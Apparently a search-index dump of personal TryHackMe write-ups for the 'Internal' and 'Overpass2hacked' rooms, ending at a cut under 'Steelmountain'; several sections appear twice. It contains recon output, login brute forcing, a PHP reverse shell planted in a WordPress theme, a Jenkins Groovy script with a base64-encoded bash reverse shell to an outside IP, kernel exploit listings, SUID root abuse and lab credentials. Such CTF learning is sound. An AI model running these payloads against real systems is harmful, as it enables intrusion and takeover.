uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false Linux Kernel $ uname -a Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux Searchsploit $ searchsploit Linux Kernel 4.15 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5) | linux/local/9479.c Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation | linux/local/50135.c Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation | linux/local/47163.c Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method) | linux/local/47164.sh Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method) | linux/local/47165.sh Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method) | linux/local/47166.sh Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method) | linux/local/47167.sh Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation | linux/local/41886.c Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak | linux/local/44325.c Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption | linux/dos/44832.txt Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free | linux/dos/44579.c ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- $ cat /etc/issue Ubuntu 18.04.4 LTS \\n \\l $ searchsploit ubuntu 18.04 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Ubuntu 18.04 - 'lxd' Privilege Escalation | linux/local/46978.sh ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- CodeMirror 5.4.0 \u00b6 MySQL \u00b6 Might be useful later. \u00b6 Remediation - https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce CVEs found by LinPEAS \u00b6 CVE-2021-3156 \u00b6 Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via \"sudoedit -s\" and a command-line argument that ends with a single backslash character. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156 https://packetstormsecurity.com/files/161230/Sudo-Buffer-Overflow-Privilege-Escalation.html CVE-2021-22555 \u00b6 A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space https://packetstormsecurity.com/files/163878/Kernel-Live-Patch-Security-Notice-LSN-0080-1.html CVE-2019-7304 \u00b6 Canonical snapd before version 2.37.1 incorrectly performed socket owner validation, allowing an attacker to run arbitrary commands as root. This issue affects: Canonical snapd versions prior to 2.37.1. https://www.exploit-db.com/exploits/46361 CVE-2019-18634 \u00b6 In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. (pwfeedback is a default setting in Linux Mint and elementary OS; however, it is NOT the default for upstream and many other packages, and would exist only if enabled by an administrator.) The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c. http://www.openwall.com/lists/oss-security/2020/02/05/5 CVE-2019-15666 \u00b6 An issue was discovered in the Linux kernel before 5.0.19. There is an out-of-bounds array access in __xfrm_policy_unlink, which will cause denial of service, because verify_newpolicy_info in net/xfrm/xfrm_user.c mishandles directory validation. CVE-2018-18955 \u00b6 In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() in kernel/user_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP_SYS_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction. https://www.exploit-db.com/exploits/45886/ CVE-2017-5618 \u00b6 GNU screen before 4.5.1 allows local users to modify arbitrary files and consequently gain root privileges by leveraging improper checking of logfile permissions. http://www.openwall.com/lists/oss-security/2017/01/29/3 CVE-2017-0358 \u00b6 Jann Horn of Google Project Zero discovered that NTFS-3G, a read-write NTFS driver for FUSE, does not scrub the environment before executing modprobe with elevated privileges. A local user can take advantage of this flaw for local root privilege escalation. https://www.exploit-db.com/exploits/41356 CVE-2011-1485 \u00b6 Race condition in the pkexec utility and polkitd daemon in PolicyKit (aka polkit) 0.96 allows local users to gain privileges by executing a setuid program from pkexec, related to the use of the effective user ID instead of the real user ID. Back to hackin \u00b6 I got into phpMyAdmin with user wordpress pass wordpress123 admin user phpmyadmin pass B2Ud4fEOZmVq Check out William's Account \u00b6 user william pass arnold147 Internal: Jenkins \u00b6 Found out Jenkins is running on 8080. I did some SSH remote forwarding and am able to access Jenkins. ssh -N -R 10.2.73.217:8080:127.0.0.1:8080 nate@10.2.73.217 PrivEsc \u00b6 After reviewing the privesc materials again, I'm confident the exploit will either be Some internal only port Some other foothold that grants higher level than www-data A kernel exploit I decided to brute force Jenkins. The header size changed here, at the password spongebob It worked! Jenkins Login User Admin Pass spongebob Using this script but changed out the base64 payload with my details Here's the full script def sout = new StringBuffer(), serr = new StringBuffer() def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjczLjIxNy80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out> $sout err> $serr\" Got a shell and did full enumeration of Jenkins. Turns out Jenkins was running in a docker container. There didn't seem to be an easy way to break out. Nothing that applied to the mission (no ssh public keys, etc.) I went back to searching for Kernel Exploits. I was able to get full root with CVE-2021-3493 I was able to get the user and root flag. Case closed....sort of. The root flag contained docker destroyer which means I should probably learn docker and docker breakout some day. I just got lucky and found a recent exploit that wasn't patched in this room.","title":"Internal"},{"location":"TryHackMe/internal/#internal","text":"","title":"Internal"},{"location":"TryHackMe/internal/#recon","text":"The intro mentions","title":"Recon"},{"location":"TryHackMe/internal/#flags","text":"- User.txt - Root.txt","title":"Flags"},{"location":"TryHackMe/internal/#rules","text":"- Modify hosts file to reflect internal.thm - All tools/techniques are allowed. - Locate and note all vulnerabilites on the machine. - Submit flags to dashboard. - Stay in scope - this IP only.","title":"Rules"},{"location":"TryHackMe/internal/#service-enumeration","text":"\u2514\u2500$ nmap -sV -T5 10.10.123.49 | tee quickscan Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:30 CDT Nmap scan report for 10.10.123.49 Host is up (0.20s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds","title":"Service Enumeration"},{"location":"TryHackMe/internal/#openssh-76p1","text":"Possible Username Enumeration User aubreanna Try to brute force.","title":"OpenSSH 7.6p1"},{"location":"TryHackMe/internal/#apache-2429-ubuntu","text":"Possible RCE and PrivEsc","title":"Apache 2.4.29 (ubuntu)"},{"location":"TryHackMe/internal/#webserver","text":"Default Apache frontpage.","title":"WebServer"},{"location":"TryHackMe/internal/#feroxbuster","text":"Ran another Feroxbuster for /blog 200 83l 284w 4530c http://internal.thm/blog/wp-login.php 200 328l 3640w 0c http://internal.thm/blog/ 200 97l 823w 7278c http://internal.thm/blog/readme.html 200 5l 15w 135c http://internal.thm/blog/wp-trackback.php 200 384l 3177w 19915c http://internal.thm/blog/license.txt 200 0l 0w 0c http://internal.thm/blog/wp-config.php 200 0l 0w 0c http://internal.thm/blog/wp-cron.php 200 0l 0w 0c http://internal.thm/blog/wp-blog-header.php 200 11l 23w 223c http://internal.thm/blog/wp-links-opml.php 200 0l 0w 0c http://internal.thm/blog/wp-load.php 301 9l 28w 320c http://internal.thm/blog/wp-admin 301 0l 0w 0c http://internal.thm/blog/index.php 301 9l 28w 323c http://internal.thm/blog/wp-includes 301 9l 28w 322c http://internal.thm/blog/wp-content 302 0l 0w 0c http://internal.thm/blog/wp-signup.php 302 0l 0w 0c http://internal.thm/blog/wp-activate.php 500 0l 0w 0c http://internal.thm/blog/wp-settings.php","title":"Feroxbuster"},{"location":"TryHackMe/internal/#php-gotta-be-higher-than-5620-per-phpmyadmin","text":"","title":"PHP (gotta be higher than 5.6.20 per phpMyAdmin)"},{"location":"TryHackMe/internal/#phpmyadmin-466","text":"Login Page FeroxBuster $ feroxbuster -u http://internal.thm:80/phpmyadmin/ -t 10 -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -q -o \"/home/nate/tryhackme/boxes/active/internal/results/scans/tcp80/tcp_80_http_phpmyadmin_feroxbuster_raft-large-words.txt\" 403 9l 28w 277c http://internal.thm/phpmyadmin/.html 403 9l 28w 277c http://internal.thm/phpmyadmin/.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.txt 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.html 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.asp 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.aspx 403 9l 28w 277c http://internal.thm/phpmyadmin/.html.jsp 403 9l 28w 277c http://internal.thm/phpmyadmin/templates 301 9l 28w 324c http://internal.thm/phpmyadmin/themes 301 9l 28w 320c http://internal.thm/phpmyadmin/js 200 26l 359w 0c http://internal.thm/phpmyadmin/index.php 200 26l 359w 0c http://internal.thm/phpmyadmin/themes.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm 403 9l 28w 277c http://internal.thm/phpmyadmin/libraries 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.txt 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.html 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.php 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.asp 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.aspx 403 9l 28w 277c http://internal.thm/phpmyadmin/.htm.jsp 200 26l 359w 0c http://internal.thm/phpmyadmin/logout.php [ ] Brute Force","title":"phpMyAdmin 4.6.6"},{"location":"TryHackMe/internal/#wordpress-542","text":"$ wpscan http://internal.thm:80/blog/ -o wpscan Results [+] URL: http://internal.thm/blog/ [10.10.41.223] [+] Started: Sat Nov 6 13:22:11 2021 Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://internal.thm/blog/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10). | Found By: Rss Generator (Passive Detection) | - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator> | - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator> [+] WordPress theme in use: twentyseventeen | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/ | Last Updated: 2021-07-22T00:00:00.000Z | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt | [!] The version is out of date, the latest version is 2.8 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 2.3 (80% confidence) | Found By: Style (Passive Detection) | - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'","title":"Wordpress 5.4.2"},{"location":"TryHackMe/internal/#xml-rpc","text":"----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Cuckoo Sandbox Guest 2.0.1 - XMLRPC Privileged Remote Code Execution | windows/remote/40043.py Movable Type 7 r.5002 - XMLRPC API OS Command Injection (Metasploit) | cgi/webapps/50464.rb PHP 5.3.2 'xmlrpc' Extension - Multiple Remote Denial of Service Vulnerabilities | php/dos/33755.php PHPXMLRPC < 1.1 - Remote Code Execution | php/webapps/43829.txt SonicWall Global Management System - XMLRPC set_time_zone Command Injection (Metasploit) | linux/remote/45124.rb vBulletin 4.x - breadcrumbs via xmlrpc API (Authenticated) SQL Injection | php/webapps/40115.py vBulletin 4.x/5.x - AdminCP/ApiLog via xmlrpc API (Authenticated) Persistent Cross-Site Scripting | php/webapps/40114.py WordPress Core 1.5.1.2 - 'xmlrpc' Interface SQL Injection | php/webapps/1077.pl WordPress Core 2.1.2 - 'xmlrpc' SQL Injection | php/webapps/3656.pl WordPress Core 2.2 - 'xmlrpc.php' SQL Injection | php/webapps/4039.txt WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service | php/dos/47800.py XML-RPC Library 1.3.0 - 'xmlrpc.php' Arbitrary Code Execution (Metasploit) | php/webapps/16882.rb XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Code Injection | php/webapps/1078.pl XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (2) | php/webapps/1083.pl XML-RPC Library 1.3.0 - 'xmlrpc.php' Remote Command Execution (3) | php/webapps/1084.pl XOOPS 2.0.11 - 'xmlrpc.php' SQL Injection | php/webapps/1082.pl Yukihiro Matsumoto Ruby 1.x - XMLRPC Server Denial of Service | linux/dos/27723.txt ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------","title":"XML-RPC"},{"location":"TryHackMe/internal/#wordpress-readme-found-httpinternalthmblogreadmehtml","text":"System requirements are laid out in the readme.","title":"WordPress readme found: http://internal.thm/blog/readme.html"},{"location":"TryHackMe/internal/#wordpress-version-542","text":"https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce","title":"WordPress version 5.4.2"},{"location":"TryHackMe/internal/#wordpress-theme-twentyseventeen-v-23-80","text":"Login Page","title":"WordPress theme twentyseventeen v 2.3 (80%)"},{"location":"TryHackMe/internal/#username-disclosure","text":"found username admin on blog post Forgot password can be brute forced to check for valid users invalid username valid username Powershell to bruteforce $validUsers = [System.collections.arraylist]::new(); $usernames | %{ >> $user = $_; >> $body = \"user_login=$user&redirect_to=&wp-submit=Get+New+Password\"; >> $r = Invoke-RestMethod -Method POST -Uri $url -Body $body; >> if($r -like \"*no account*\"){Write-Host -ForegroundColor Red $user}else{Write-Host -ForegroundColor Green $user; $validUsers.Add($user)>$null;} >> $validUsers >> } ZAP bruteforce with username: admin passwordfile: rockyou.txt","title":"Username disclosure"},{"location":"TryHackMe/internal/#wordpress-login","text":"Username: admin Password: my2boys Following this Guide: https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce 1. Go to Dashboard > Appearance > Theme Editor > 404 Template 2. Paste the contents of a php reverse shell - using /usr/share/webshells/php/php-reverse-shell.php for this test. 1. Change lines 49 and 50 to reflect your shell listener. 3. Load the 404 page. 1. URL http://internal.thm/blog/index.php/2020/08/03/6/ Caught the shell with netcat. \u2514\u2500$ nc -nvlp 4455 listening on [any] 4455 ... connect to [10.2.73.217] from (UNKNOWN) [10.10.251.234] 58026 Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 21:13:57 up 52 min, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ whoami www-data $ www-data has nearly no permissions, but he can read /etc/passwd $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false Linux Kernel $ uname -a Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux Searchsploit $ searchsploit Linux Kernel 4.15 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Linux Kernel 2.4/2.6 (RedHat Linux 9 / Fedora Core 4 < 11 / Whitebox 4 / CentOS 4) - 'sock_sendpage()' Ring0 Privilege Escalation (5) | linux/local/9479.c Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation | linux/local/50135.c Linux Kernel 4.10 < 5.1.17 - 'PTRACE_TRACEME' pkexec Local Privilege Escalation | linux/local/47163.c Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (cron Method) | linux/local/47164.sh Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (dbus Method) | linux/local/47165.sh Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (ldpreload Method) | linux/local/47166.sh Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escalation (polkit Method) | linux/local/47167.sh Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation | linux/local/41886.c Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak | linux/local/44325.c Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption | linux/dos/44832.txt Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free | linux/dos/44579.c ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- $ cat /etc/issue Ubuntu 18.04.4 LTS \\n \\l $ searchsploit ubuntu 18.04 ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Ubuntu 18.04 - 'lxd' Privilege Escalation | linux/local/46978.sh ----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------","title":"Wordpress Login"},{"location":"TryHackMe/internal/#codemirror-540","text":"","title":"CodeMirror 5.4.0"},{"location":"TryHackMe/internal/#mysql","text":"","title":"MySQL"},{"location":"TryHackMe/internal/#might-be-useful-later","text":"Remediation - https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress#panel-rce","title":"Might be useful later."},{"location":"TryHackMe/internal/#cves-found-by-linpeas","text":"","title":"CVEs found by LinPEAS"},{"location":"TryHackMe/internal/#cve-2021-3156","text":"Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via \"sudoedit -s\" and a command-line argument that ends with a single backslash character. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156 https://packetstormsecurity.com/files/161230/Sudo-Buffer-Overflow-Privilege-Escalation.html","title":"CVE-2021-3156"},{"location":"TryHackMe/internal/#cve-2021-22555","text":"A heap out-of-bounds write affecting Linux since v2.6.19-rc1 was discovered in net/netfilter/x_tables.c. This allows an attacker to gain privileges or cause a DoS (via heap memory corruption) through user name space https://packetstormsecurity.com/files/163878/Kernel-Live-Patch-Security-Notice-LSN-0080-1.html","title":"CVE-2021-22555"},{"location":"TryHackMe/internal/#cve-2019-7304","text":"Canonical snapd before version 2.37.1 incorrectly performed socket owner validation, allowing an attacker to run arbitrary commands as root. This issue affects: Canonical snapd versions prior to 2.37.1. https://www.exploit-db.com/exploits/46361","title":"CVE-2019-7304"},{"location":"TryHackMe/internal/#cve-2019-18634","text":"In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. (pwfeedback is a default setting in Linux Mint and elementary OS; however, it is NOT the default for upstream and many other packages, and would exist only if enabled by an administrator.) The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c. http://www.openwall.com/lists/oss-security/2020/02/05/5","title":"CVE-2019-18634"},{"location":"TryHackMe/internal/#cve-2019-15666","text":"An issue was discovered in the Linux kernel before 5.0.19. There is an out-of-bounds array access in __xfrm_policy_unlink, which will cause denial of service, because verify_newpolicy_info in net/xfrm/xfrm_user.c mishandles directory validation.","title":"CVE-2019-15666"},{"location":"TryHackMe/internal/#cve-2018-18955","text":"In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() in kernel/user_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP_SYS_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction. https://www.exploit-db.com/exploits/45886/","title":"CVE-2018-18955"},{"location":"TryHackMe/internal/#cve-2017-5618","text":"GNU screen before 4.5.1 allows local users to modify arbitrary files and consequently gain root privileges by leveraging improper checking of logfile permissions. http://www.openwall.com/lists/oss-security/2017/01/29/3","title":"CVE-2017-5618"},{"location":"TryHackMe/internal/#cve-2017-0358","text":"Jann Horn of Google Project Zero discovered that NTFS-3G, a read-write NTFS driver for FUSE, does not scrub the environment before executing modprobe with elevated privileges. A local user can take advantage of this flaw for local root privilege escalation. https://www.exploit-db.com/exploits/41356","title":"CVE-2017-0358"},{"location":"TryHackMe/internal/#cve-2011-1485","text":"Race condition in the pkexec utility and polkitd daemon in PolicyKit (aka polkit) 0.96 allows local users to gain privileges by executing a setuid program from pkexec, related to the use of the effective user ID instead of the real user ID.","title":"CVE-2011-1485"},{"location":"TryHackMe/internal/#back-to-hackin","text":"I got into phpMyAdmin with user wordpress pass wordpress123 admin user phpmyadmin pass B2Ud4fEOZmVq","title":"Back to hackin"},{"location":"TryHackMe/internal/#check-out-williams-account","text":"user william pass arnold147","title":"Check out William's Account"},{"location":"TryHackMe/internal/#internal-jenkins","text":"Found out Jenkins is running on 8080. I did some SSH remote forwarding and am able to access Jenkins. ssh -N -R 10.2.73.217:8080:127.0.0.1:8080 nate@10.2.73.217","title":"Internal: Jenkins"},{"location":"TryHackMe/internal/#privesc","text":"After reviewing the privesc materials again, I'm confident the exploit will either be Some internal only port Some other foothold that grants higher level than www-data A kernel exploit I decided to brute force Jenkins. The header size changed here, at the password spongebob It worked! Jenkins Login User Admin Pass spongebob Using this script but changed out the base64 payload with my details Here's the full script def sout = new StringBuffer(), serr = new StringBuffer() def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yLjczLjIxNy80NDQ0IDA+JjEnCg==}|{base64,-d}|{bash,-i}'.execute() proc.consumeProcessOutput(sout, serr) proc.waitForOrKill(1000) println \"out> $sout err> $serr\" Got a shell and did full enumeration of Jenkins. Turns out Jenkins was running in a docker container. There didn't seem to be an easy way to break out. Nothing that applied to the mission (no ssh public keys, etc.) I went back to searching for Kernel Exploits. I was able to get full root with CVE-2021-3493 I was able to get the user and root flag. Case closed....sort of. The root flag contained docker destroyer which means I should probably learn docker and docker breakout some day. I just got lucky and found a recent exploit that wasn't patched in this room.","title":"PrivEsc"},{"location":"TryHackMe/overpass2hacked/","text":"Overpass2hacked \u00b6 Examine capture file Copy hashes from /etc/shadow for offline cracking with fasttrack.txt in john ound 4 passwords \u2022 secret12 (bee) \u2022 abcd123 (szymex) \u2022 1qaz2wsx (muirland) secuirty3 (paradox) Initial access \u00b6 The hacker left a backdoor on SSH port 2222 Username: james Password: november16 Enumeration \u00b6 Got kernel version \u00b6 uname -a search for Linux Kernel 4.15 exploits \u00b6 $ searchsploit linux 4.15 Look around the file system \u00b6 Abusing .suid_bash \u00b6 james@overpass-production:/home/james$ ./.suid_bash -p .suid_bash-4.4# whoami root .suid_bash-4.4# cd /root .suid_bash-4.4# ls root.txt .suid_bash-4.4# cat root.txt thm{d53b2684f169360bb9606c333873144d} root flag thm{d53b2684f169360bb9606c333873144d}","title":"Overpass2hacked"},{"location":"TryHackMe/overpass2hacked/#overpass2hacked","text":"Examine capture file Copy hashes from /etc/shadow for offline cracking with fasttrack.txt in john ound 4 passwords \u2022 secret12 (bee) \u2022 abcd123 (szymex) \u2022 1qaz2wsx (muirland) secuirty3 (paradox)","title":"Overpass2hacked"},{"location":"TryHackMe/overpass2hacked/#initial-access","text":"The hacker left a backdoor on SSH port 2222 Username: james Password: november16","title":"Initial access"},{"location":"TryHackMe/overpass2hacked/#enumeration","text":"","title":"Enumeration"},{"location":"TryHackMe/overpass2hacked/#got-kernel-version","text":"uname -a","title":"Got kernel version"},{"location":"TryHackMe/overpass2hacked/#search-for-linux-kernel-415-exploits","text":"$ searchsploit linux 4.15","title":"search for Linux Kernel 4.15 exploits"},{"location":"TryHackMe/overpass2hacked/#look-around-the-file-system","text":"","title":"Look around the file system"},{"location":"TryHackMe/overpass2hacked/#abusing-suid_bash","text":"james@overpass-production:/home/james$ ./.suid_bash -p .suid_bash-4.4# whoami root .suid_bash-4.4# cd /root .suid_bash-4.4# ls root.txt .suid_bash-4.4# cat root.txt thm{d53b2684f169360bb9606c333873144d} root flag thm{d53b2684f169360bb9606c333873144d}","title":"Abusing .suid_bash"},{"location":"TryHackMe/steelmountain/","text":"Steelmountain \u00b6 Started taking notes on this one 